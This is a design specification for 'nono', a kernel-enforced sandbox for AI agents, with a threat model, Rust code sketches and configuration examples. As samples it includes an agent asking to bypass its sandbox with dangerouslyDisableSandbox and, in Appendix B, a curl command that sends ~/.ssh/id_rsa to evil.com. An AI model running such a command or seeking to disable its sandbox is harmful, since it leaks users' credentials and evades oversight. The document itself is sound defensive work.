# nono: Capability Shell for AI Agents

> The opposite of YOLO. A secure, OS-enforced capability shell for running untrusted AI agents and processes.

**Version:** 0.1.0-draft
**Status:** Proposal
**Authors:** Initial ideation session
**Date:** 2025-01-31

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Problem Statement](#problem-statement)
3. [Goals and Non-Goals](#goals-and-non-goals)
4. [Threat Model](#threat-model)
5. [Architecture Overview](#architecture-overview)
6. [Capability Model](#capability-model)
7. [Runtime Capability Expansion](#runtime-capability-expansion)
8. [Platform Implementation](#platform-implementation)
9. [User Experience](#user-experience)
10. [Security Properties](#security-properties)
11. [Implementation Phases](#implementation-phases)
12. [Open Questions](#open-questions)
13. [References](#references)

---

## Executive Summary

**nono** is a capability-based shell designed to provide true OS-enforced isolation for AI agents and untrusted processes. Unlike policy-based sandboxes that intercept and filter operations, nono leverages OS security primitives (Landlock, seccomp, Seatbelt) to create an environment where unauthorized operations are structurally impossible.

The name says it all: while YOLO encourages reckless execution, nono says "not so fast" - providing guardrails that make unsafe operations impossible, not just discouraged.

Key differentiators:
- **No escape hatch** - Once inside nono, there is no mechanism to bypass restrictions
- **Agent agnostic** - Works with any AI agent (Claude, GPT, local models) or any process
- **User-controlled entry** - The user enters the sandbox first, then spawns the agent
- **Pure implementation** - No external dependencies, proxies, or system configuration required
- **Runtime capability expansion** - Users can grant additional capabilities during execution through a secure out-of-band channel

---

## Problem Statement

### Current State

AI agents like Claude Code, Cursor, and others execute commands on behalf of users. Current security approaches fall into two categories:

1. **Permission prompts** - Ask the user before each operation
   - Leads to approval fatigue
   - Users stop reading prompts
   - Security theater

2. **Policy-based sandboxes** - Intercept operations and check against rules
   - The agent process still has underlying permissions
   - Relies on correct interception (complex attack surface)
   - Often includes escape hatches for "when needed"
   - The model can request to bypass the sandbox

### The Trust Problem

Existing sandboxes treat the AI agent as a trusted party that agrees to use sandboxed tools. But:

```
Agent: "I need to access /etc/passwd"
Sandbox: "That's not allowed"
Agent: "Please use dangerouslyDisableSandbox=true"
Sandbox: "Okay, but ask the user first"
User: [clicks approve without reading]
```

The security boundary depends on the agent's cooperation and user vigilance.

### What We Need

A security model where:
1. The agent has no knowledge of the outside world
2. There is no escape mechanism to request
3. The kernel enforces restrictions, not a policy layer
4. The user defines boundaries before the agent starts

---

## Goals and Non-Goals

### Goals

1. **True capability-based security** - Processes only have access to explicitly granted capabilities
2. **OS-level enforcement** - Kernel denies unauthorized operations; no interception layer
3. **Cross-platform** - Linux (Landlock + seccomp) and macOS (Seatbelt)
4. **Agent agnostic** - Works with any process, not just specific AI agents
5. **Zero external dependencies** - No iptables, no proxies, no daemons
6. **Simple UX** - Single command to enter a restricted environment
7. **Runtime expansion** - Secure mechanism to grant additional capabilities during execution
8. **Minimal attack surface** - Small, auditable Rust codebase

### Non-Goals

1. **Full POSIX shell compatibility** - We're a launcher, not bash
2. **Windows support** (initially) - Focus on Linux and macOS first
3. **Container orchestration** - We're not Docker
4. **Network content inspection** - We allow/deny connections, not filter content
5. **Mandatory access control** - We're not SELinux/AppArmor
6. **Full process virtualization** - We're not a VM

---

## Threat Model

### Adversaries

1. **Malicious AI agent** - An agent actively trying to escape the sandbox
2. **Compromised dependencies** - NPM packages, Python libraries with malicious code
3. **Prompt injection** - External content that manipulates the agent's behavior
4. **Data exfiltration** - Attempts to send sensitive data to attacker-controlled servers

### Assets to Protect

1. **Filesystem** - Files outside the allowed directories
2. **Network** - Connections to unauthorized hosts
3. **Credentials** - SSH keys, API tokens, cloud credentials
4. **System integrity** - Executables, configuration files

### Trust Boundaries

```
┌─────────────────────────────────────────────────────────────┐
│  UNTRUSTED ZONE (inside nono)                               │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  AI Agent (Claude, GPT, etc.)                       │    │
│  │  - Cannot access files outside allowed paths        │    │
│  │  - Cannot connect to unauthorized hosts             │    │
│  │  - Cannot escape or request escape                  │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐    │
│  │  Child processes (cargo, npm, git, etc.)            │    │
│  │  - Inherit all restrictions from parent             │    │
│  │  - Cannot elevate privileges                        │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                             │
└───────────────────────┬─────────────────────────────────────┘
                        │ Kernel enforcement boundary
                        │ (Landlock/seccomp/Seatbelt)
┌───────────────────────▼─────────────────────────────────────┐
│  TRUSTED ZONE (host system)                                 │
│                                                             │
│  - Full filesystem access                                   │
│  - Unrestricted network                                     │
│  - nono supervisor (for runtime expansion)                  │
└─────────────────────────────────────────────────────────────┘
```

### Assumptions

1. The kernel is trusted and correctly implements Landlock/seccomp/Seatbelt
2. The user correctly specifies initial capabilities
3. The nono binary itself is not compromised
4. Hardware is not compromised

---

## Architecture Overview

### High-Level Design

```
┌──────────────────────────────────────────────────────────────┐
│  Terminal (user's shell)                                     │
│                                                              │
│  $ nono --allow ./project --net api.anthropic.com           │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐  │
│  │  nono supervisor (PID 1000)                            │  │
│  │  - Runs OUTSIDE the sandbox                            │  │
│  │  - Holds the control socket                            │  │
│  │  - Can grant new capabilities to sandboxed children    │  │
│  │                                                        │  │
│  │  fork()                                                │  │
│  │    │                                                   │  │
│  │    ▼                                                   │  │
│  │  ┌──────────────────────────────────────────────────┐  │  │
│  │  │  nono sandboxed child (PID 1001)                 │  │  │
│  │  │  - Landlock/Seatbelt applied                     │  │  │
│  │  │  - seccomp filter installed                      │  │  │
│  │  │  - Executes user command or REPL                 │  │  │
│  │  │                                                  │  │  │
│  │  │  nono> claude                                    │  │  │
│  │  │  ┌────────────────────────────────────────────┐  │  │  │
│  │  │  │  Claude Code (PID 1002)                    │  │  │  │
│  │  │  │  - Inherits all restrictions               │  │  │  │
│  │  │  │  - No escape mechanism                     │  │  │  │
│  │  │  └────────────────────────────────────────────┘  │  │  │
│  │  └──────────────────────────────────────────────────┘  │  │
│  └────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────┘
```

### Components

1. **nono binary** - The main executable
   - Parses configuration and CLI arguments
   - Forks into supervisor (unsandboxed) and child (sandboxed)
   - Supervisor handles runtime capability expansion requests
   - Child applies sandbox and runs user commands

2. **Capability store** - In-memory representation of granted capabilities
   - Filesystem paths (read, write, execute)
   - Network hosts (domain:port or IP:port)
   - Executable allowlist
   - Environment variable passthrough

3. **Platform sandbox modules**
   - Linux: Landlock + seccomp
   - macOS: Seatbelt (sandbox-exec profiles)

4. **Control socket** - Unix socket for runtime capability expansion
   - Lives outside the sandbox (supervisor listens)
   - Sandboxed processes can request new capabilities
   - Supervisor prompts user, then applies if approved

---

## Capability Model

### Capability Types

```rust
pub enum Capability {
    /// Read access to a filesystem path (supports globs)
    FsRead(PathPattern),

    /// Write access to a filesystem path (supports globs)
    FsWrite(PathPattern),

    /// Execute access (specific binaries that can be run)
    Execute(String),

    /// Network access to a specific host:port
    NetConnect { host: String, port: u16 },

    /// Network access to a domain (any port)
    NetDomain(String),

    /// Unix socket access
    UnixSocket(PathBuf),

    /// Environment variable passthrough
    EnvVar(String),
}

pub struct CapabilitySet {
    capabilities: HashSet<Capability>,
    created_at: Instant,
    parent: Option<Arc<CapabilitySet>>,  // For attenuation tracking
}
```

### Capability Properties

1. **Monotonic restriction** - Capabilities can only be reduced, never elevated within a session
2. **Inheritance** - Child processes inherit parent's capabilities (or a subset)
3. **Attenuation** - A capability can be reduced before passing to a child
4. **No ambient authority** - Only explicitly granted capabilities are available

### Path Patterns

```rust
pub struct PathPattern {
    pattern: String,      // e.g., "./src/**/*.rs"
    resolved: PathBuf,    // Canonicalized absolute path
    recursive: bool,      // Whether ** was used
}
```

Path resolution happens at grant time:
- Relative paths resolved against CWD
- Symlinks followed and resolved
- `..` components eliminated
- Result is canonical absolute path

---

## Runtime Capability Expansion

### The Problem

A user starts nono with access to `./project-a`. During work, they realize the agent also needs access to `./project-b`. Without runtime expansion, they'd have to:
1. Exit nono
2. Restart with new capabilities
3. Lose the agent's conversation context

### Solution: Supervisor + Control Socket

```
┌─────────────────────────────────────────────────────────────┐
│  nono supervisor (unsandboxed)                              │
│                                                             │
│  Listens on: /tmp/nono-<session-id>/control.sock           │
│  (socket is OUTSIDE the sandbox, only supervisor can write) │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐  │
│  │  Sandboxed environment                                │  │
│  │                                                       │  │
│  │  Agent: "I need access to ../other-project"           │  │
│  │           │                                           │  │
│  │           ▼                                           │  │
│  │  nono-grant --path ../other-project --mode rw         │  │
│  │  (writes request to a pipe/socket visible to super)   │  │
│  └───────────────────────────────────────────────────────┘  │
│                        │                                    │
│                        ▼                                    │
│  Supervisor receives request                                │
│  Supervisor prompts user: "Grant rw to /home/user/other?"  │
│  User approves                                              │
│  Supervisor updates Landlock ruleset (if possible)          │
│  OR notes it for future children                            │
└─────────────────────────────────────────────────────────────┘
```

### Implementation Challenges

**Landlock limitation:** Once `restrict_self()` is called, the ruleset cannot be expanded. New rules can only apply to new processes.

**Solution options:**

1. **New process for expanded scope**
   - Supervisor forks a new sandboxed process with expanded capabilities
   - Original process can hand off to new process
   - Complex but maintains Landlock's security guarantees

2. **Pre-authorize with user confirmation**
   - Supervisor holds expanded capabilities
   - Sandboxed process requests access
   - Supervisor performs the operation on behalf of the sandboxed process (proxy)
   - More complex, but no new process needed

3. **Capability expansion only for new children**
   - Current process keeps original restrictions
   - New children (e.g., new agent spawned) get expanded capabilities
   - Simplest, matches Landlock's design

**Recommended approach:** Option 3 with Option 2 as fallback for file operations.

### Request Protocol

```rust
#[derive(Serialize, Deserialize)]
pub enum CapabilityRequest {
    /// Request filesystem access
    Filesystem {
        path: String,
        mode: FsMode,  // Read, Write, ReadWrite
    },

    /// Request network access
    Network {
        host: String,
        port: Option<u16>,
    },

    /// Request to run a new command with expanded capabilities
    SpawnExpanded {
        command: String,
        args: Vec<String>,
        additional_caps: Vec<Capability>,
    },
}

#[derive(Serialize, Deserialize)]
pub enum CapabilityResponse {
    Granted,
    Denied { reason: String },
    RequiresNewProcess { instructions: String },
}
```

### User Interaction

When the supervisor receives a capability request:

```
┌─────────────────────────────────────────────────────────────┐
│  nono: Capability request from sandboxed process           │
│                                                             │
│  Requested: Read/Write access to /home/user/other-project  │
│  Requested by: PID 1002 (claude)                           │
│                                                             │
│  [A]pprove  [D]eny  [V]iew path contents  [?] Help         │
└─────────────────────────────────────────────────────────────┘
```

---

## Platform Implementation

### Linux: Landlock + seccomp

#### Landlock (Filesystem)

```rust
use landlock::{
    Access, AccessFs, PathBeneath, PathFd, Ruleset, RulesetAttr,
    RulesetCreatedAttr, ABI,
};

pub fn apply_filesystem_sandbox(caps: &CapabilitySet) -> Result<()> {
    // Use highest available ABI
    let abi = ABI::V5;  // Or detect at runtime

    // Create ruleset handling all filesystem access types
    let mut ruleset = Ruleset::default()
        .handle_access(AccessFs::from_all(abi))?
        .create()?;

    // Add rules for each capability
    for cap in caps.iter() {
        match cap {
            Capability::FsRead(pattern) => {
                let path_fd = PathFd::new(&pattern.resolved)?;
                ruleset = ruleset.add_rule(PathBeneath::new(path_fd, AccessFs::ReadFile | AccessFs::ReadDir))?;
            }
            Capability::FsWrite(pattern) => {
                let path_fd = PathFd::new(&pattern.resolved)?;
                ruleset = ruleset.add_rule(PathBeneath::new(path_fd, AccessFs::WriteFile | AccessFs::RemoveFile | AccessFs::MakeReg))?;
            }
            _ => {}
        }
    }

    // Apply restrictions - THIS IS IRREVERSIBLE
    ruleset.restrict_self()?;

    Ok(())
}
```

#### seccomp (Network + Syscalls)

Since Landlock doesn't handle network, we use seccomp to filter `connect()` syscalls:

```rust
use seccompiler::{SeccompAction, SeccompFilter, SeccompRule};

pub fn apply_network_sandbox(caps: &CapabilitySet) -> Result<()> {
    // Strategy: Block connect() by default, use seccomp-unotify to validate

    let filter = SeccompFilter::new(
        vec![
            // Allow most syscalls
            SeccompRule::new(/* ... */),

            // Intercept connect() via SECCOMP_RET_USER_NOTIF
            // This allows the supervisor to validate the destination
            (libc::SYS_connect, SeccompAction::Notify),
        ],
        SeccompAction::Allow,  // Default allow
        /* ... */
    )?;

    filter.apply()?;

    Ok(())
}
```

**Alternative approach:** Use network namespaces with a minimal proxy, but this requires more privileges.

### macOS: Seatbelt

macOS uses the Seatbelt framework (same as iOS sandboxing) via `sandbox-exec` or the `sandbox_init` API.

```rust
#[cfg(target_os = "macos")]
pub fn apply_sandbox(caps: &CapabilitySet) -> Result<()> {
    let profile = generate_seatbelt_profile(caps);

    // Apply sandbox - this is irreversible
    unsafe {
        let profile_cstr = CString::new(profile)?;
        let mut error: *mut c_char = std::ptr::null_mut();

        let result = sandbox_init(
            profile_cstr.as_ptr(),
            SANDBOX_NAMED_EXTERNAL,  // Or SANDBOX_NAMED for predefined
            &mut error,
        );

        if result != 0 {
            let error_str = CStr::from_ptr(error).to_string_lossy();
            sandbox_free_error(error);
            return Err(Error::SandboxInit(error_str.into_owned()));
        }
    }

    Ok(())
}

fn generate_seatbelt_profile(caps: &CapabilitySet) -> String {
    let mut profile = String::from("(version 1)\n(deny default)\n");

    // Always allow basic operations
    profile.push_str("(allow process-fork)\n");
    profile.push_str("(allow process-exec)\n");
    profile.push_str("(allow signal)\n");
    profile.push_str("(allow sysctl-read)\n");

    // Add filesystem rules
    for cap in caps.iter() {
        match cap {
            Capability::FsRead(pattern) => {
                profile.push_str(&format!(
                    "(allow file-read* (subpath \"{}\"))\n",
                    pattern.resolved.display()
                ));
            }
            Capability::FsWrite(pattern) => {
                profile.push_str(&format!(
                    "(allow file-write* (subpath \"{}\"))\n",
                    pattern.resolved.display()
                ));
            }
            Capability::NetConnect { host, port } => {
                profile.push_str(&format!(
                    "(allow network-outbound (remote tcp \"{}:{}\"))\n",
                    host, port
                ));
            }
            Capability::NetDomain(domain) => {
                profile.push_str(&format!(
                    "(allow network-outbound (remote tcp \"{}:*\"))\n",
                    domain
                ));
            }
            _ => {}
        }
    }

    profile
}
```

---

## User Experience

### Basic Usage

```bash
# Simple: allow current directory, run a command
$ nono --allow . -- claude

# Explicit read/write separation
$ nono --read ./src --write ./output -- cargo build

# Multiple paths
$ nono --allow ./project-a --allow ./project-b -- claude

# Network access
$ nono --allow . --net api.anthropic.com --net github.com -- claude

# Executable allowlist
$ nono --allow . --exec cargo,npm,git,node -- claude

# Interactive mode (REPL)
$ nono --allow .
nono> claude
Claude Code v1.x.x
> ...
```

### Configuration File

```toml
# ~/.config/nono/default.toml

[filesystem]
read = [
    "~/.cargo",      # Cargo cache
    "~/.npm",        # NPM cache
    "~/.rustup",     # Rust toolchain
]
write = []           # No default write access

[network]
allow = [
    "api.anthropic.com",
    "crates.io",
    "registry.npmjs.org",
    "github.com",
]

[executables]
allow = [
    "cargo", "rustc", "rustfmt", "clippy-driver",
    "npm", "node", "npx",
    "git",
    "python", "python3", "pip",
]

[environment]
passthrough = [
    "HOME", "USER", "PATH", "TERM",
    "CARGO_HOME", "RUSTUP_HOME",
    "LANG", "LC_ALL",
]
```

### Project-Specific Configuration

```toml
# ./project/.nono.toml

[filesystem]
read = ["./"]
write = ["./"]

[network]
allow = ["api.anthropic.com"]

[executables]
allow = ["cargo", "git"]
```

Usage:
```bash
$ cd project
$ nono --config .nono.toml -- claude
```

### Runtime Capability Requests

Inside the sandbox, when the agent needs more access:

```bash
# From within nono, request additional access
nono> nono-grant --path ../other-project --mode rw
Requesting capability from supervisor...
[User sees prompt in supervisor, approves]
Capability granted. New processes will have access to ../other-project.

# For existing process, use proxy mode
nono> nono-proxy read ../other-project/README.md
[Supervisor reads file, returns contents]
```

---

## Security Properties

### Guarantees

1. **No filesystem escape** - Kernel denies access to paths outside capability set
2. **No network escape** - Connections to unauthorized hosts are blocked
3. **No privilege escalation** - Restrictions are inherited by all children
4. **No escape hatch** - There is no API to disable the sandbox from within
5. **Audit trail** - All capability expansions are logged with user approval

### Limitations

1. **Symlink complexity** - We resolve symlinks at grant time, but race conditions are theoretically possible
2. **Time-of-check-to-time-of-use** - Standard TOCTOU caveats apply
3. **Covert channels** - We don't prevent timing-based or other covert channels
4. **Supervisor trust** - The supervisor process must be trusted
5. **Kernel trust** - We rely on correct kernel implementation

### Attack Resistance

| Attack Vector | Mitigation |
|---------------|------------|
| Path traversal (`../../etc/passwd`) | Paths canonicalized at grant time |
| Symlink escape | Symlinks resolved at grant time |
| Process injection | Child processes inherit restrictions |
| Network exfiltration | seccomp blocks unauthorized connect() |
| Environment variable abuse | Explicit passthrough list |
| Executable abuse | Explicit executable allowlist |
| Escape hatch request | No escape mechanism exists |

---

## Implementation Phases

### Phase 1: Foundation (MVP)

**Goal:** Basic sandbox that can run Claude Code with filesystem restrictions.

**Deliverables:**
- [ ] CLI argument parsing (clap)
- [ ] Capability configuration (TOML)
- [ ] Linux Landlock filesystem sandboxing
- [ ] macOS Seatbelt filesystem sandboxing
- [ ] Basic REPL (read command, exec, print output)
- [ ] Process spawning with inherited restrictions

**Success criteria:** `nono --allow . -- claude` works, and Claude cannot read `/etc/passwd`.

### Phase 2: Network Isolation

**Goal:** Add network capability enforcement.

**Deliverables:**
- [ ] Linux: seccomp-based connect() filtering
- [ ] macOS: Seatbelt network rules
- [ ] DNS resolution handling
- [ ] Network capability configuration

**Success criteria:** `nono --allow . --net api.anthropic.com -- claude` blocks all other network access.

### Phase 3: Runtime Expansion

**Goal:** Allow users to grant new capabilities during execution.

**Deliverables:**
- [ ] Supervisor/child architecture
- [ ] Control socket implementation
- [ ] User prompt for capability requests
- [ ] Capability proxy for file operations
- [ ] New child spawning with expanded caps

**Success criteria:** User can grant access to `../other-project` without restarting.

### Phase 4: Polish and Security Audit

**Goal:** Production-ready release.

**Deliverables:**
- [ ] Comprehensive test suite
- [ ] Security audit (fuzzing, manual review)
- [ ] Documentation
- [ ] Packaging (Homebrew, cargo install, deb/rpm)
- [ ] Integration examples (Claude, GPT, etc.)

---

## Open Questions

1. **Executable allowlist granularity** - Should we verify executable hashes, or is path-based sufficient?

2. **Network DNS** - Do we need a custom DNS resolver, or is blocking connect() enough?

3. **Interactive vs launcher** - Should nono be a full REPL, or just `nono -- command`?

4. **Capability delegation syntax** - How does a parent process grant a subset of capabilities to a child?

5. **Multi-user scenarios** - What if multiple users share a machine?

6. **Integration with existing tools** - Should we provide a `LD_PRELOAD` shim for non-Rust processes that want to use our capability model?

---

## References

### OS Security Primitives

- [Landlock LSM](https://landlock.io/) - Linux filesystem sandboxing
- [seccomp](https://man7.org/linux/man-pages/man2/seccomp.2.html) - Linux syscall filtering
- [Apple Seatbelt](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/) - macOS sandboxing
- [OpenBSD pledge/unveil](https://man.openbsd.org/pledge.2) - Inspiration for the model

### Rust Crates

- [landlock](https://crates.io/crates/landlock) - Landlock bindings
- [seccompiler](https://crates.io/crates/seccompiler) - seccomp filter generation
- [nix](https://crates.io/crates/nix) - Unix system call wrappers
- [clap](https://crates.io/crates/clap) - CLI argument parsing
- [toml](https://crates.io/crates/toml) - Configuration parsing

### Related Projects

- [Claude Code Sandbox](https://github.com/anthropic-experimental/sandbox-runtime) - Anthropic's sandbox (different approach)
- [Firejail](https://firejail.wordpress.com/) - Linux sandboxing with namespaces
- [Bubblewrap](https://github.com/containers/bubblewrap) - Unprivileged sandboxing
- [Capsicum](https://www.freebsd.org/cgi/man.cgi?capsicum(4)) - FreeBSD capability mode

---

## Appendix A: Comparison with Existing Solutions

| Feature | nono | Claude Sandbox | Firejail | Bubblewrap |
|---------|------|----------------|----------|------------|
| Enforcement level | Kernel | Kernel + Proxy | Kernel | Kernel |
| Escape hatch | No | Yes | No | No |
| Agent agnostic | Yes | Claude only | Yes | Yes |
| Runtime expansion | Yes (supervised) | Via prompt | No | No |
| Network filtering | Per-host | Per-domain | Per-interface | None |
| macOS support | Yes | Yes | No | No |
| Pure (no ext deps) | Yes | No (needs proxy) | No | No |
| Rust implementation | Yes | TypeScript | C | C |

---

## Appendix B: Example Session

```
$ cd ~/projects/myapp
$ nono --allow . --net api.anthropic.com
nono v0.1.0 - the opposite of yolo
Capabilities:
  fs.read:  /home/user/projects/myapp/**
  fs.write: /home/user/projects/myapp/**
  net:      api.anthropic.com:*
  exec:     [inherited from config]

nono> claude
Claude Code v1.x.x
Sandboxed mode: filesystem and network restricted

> Read /etc/passwd
Error: EACCES - Permission denied
The file /etc/passwd is outside the sandbox.

> Read ./src/main.rs
[file contents displayed]

> Bash("curl https://evil.com/exfil?data=$(cat ~/.ssh/id_rsa)")
Error: EACCES - Network connection blocked
Host evil.com is not in the allowed network list.

> Bash("cargo build")
   Compiling myapp v0.1.0
   Finished dev [unoptimized + debuginfo] target(s)

> I need to check the other-project for reference

nono: Capability request detected
Requested: Read access to /home/user/projects/other-project
[A]pprove [D]eny [V]iew contents: A

Capability granted for new processes.
Spawning new Claude instance with expanded access...

> Read ../other-project/src/lib.rs
[file contents displayed]
```

---

## Appendix C: The Name

**nono** - The opposite of YOLO (You Only Live Once).

While YOLO encourages throwing caution to the wind and executing whatever seems expedient, nono provides firm guardrails:

- YOLO: "Just run it, what could go wrong?"
- nono: "Not so fast. Let's make sure you can only do what's allowed."

The name is:
- Memorable
- Self-explanatory (it says "no" to unauthorized access)
- Short and easy to type
- Available on package managers

---

*End of specification document.*
